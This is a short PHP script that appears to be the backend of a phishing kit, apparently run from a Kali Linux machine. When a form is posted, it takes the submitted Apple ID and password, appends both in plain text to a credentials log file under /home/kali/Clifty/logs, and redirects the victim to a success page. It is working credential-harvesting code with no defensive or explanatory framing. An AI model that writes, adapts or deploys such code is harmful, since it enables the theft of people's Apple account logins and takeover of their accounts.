<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the submitted form data
    $apple_id = htmlspecialchars($_POST['apple-id']);
    $password = htmlspecialchars($_POST['password']);

    // Define the absolute path to the credentials file
    $file_path = "/home/kali/Clifty/logs/credentials.txt";

    // Save the credentials to the file
    $file = fopen($file_path, "a");
    if ($file) {
        fwrite($file, "Apple ID: " . $apple_id . " | Password: " . $password . "\n");
        fclose($file);
    } else {
        error_log("Unable to open file: " . $file_path);
    }

    // Redirect to a success page or back to the login page
    header("Location: success.html");
    exit();
}
?>
